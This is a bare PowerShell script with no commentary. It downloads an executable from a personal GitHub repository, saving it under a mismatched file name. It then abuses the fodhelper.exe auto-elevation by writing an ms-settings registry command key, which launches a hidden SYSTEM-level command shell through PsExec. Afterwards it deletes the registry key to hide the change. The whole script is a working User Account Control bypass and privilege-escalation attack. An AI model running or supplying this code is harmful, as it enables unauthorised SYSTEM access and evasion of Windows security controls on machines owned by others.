irm https://github.com/petergriuffin123/feg/raw/refs/heads/main/PsExec.exe -o psexec.ps1
Start-Sleep 3
function ffv {
    $Key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item -Path $Key -Force
    New-ItemProperty -Path $Key -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $Key -Name "(default)" -Value "$PWD\psexec.exe -i -s cmd.exe" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}
ffv  
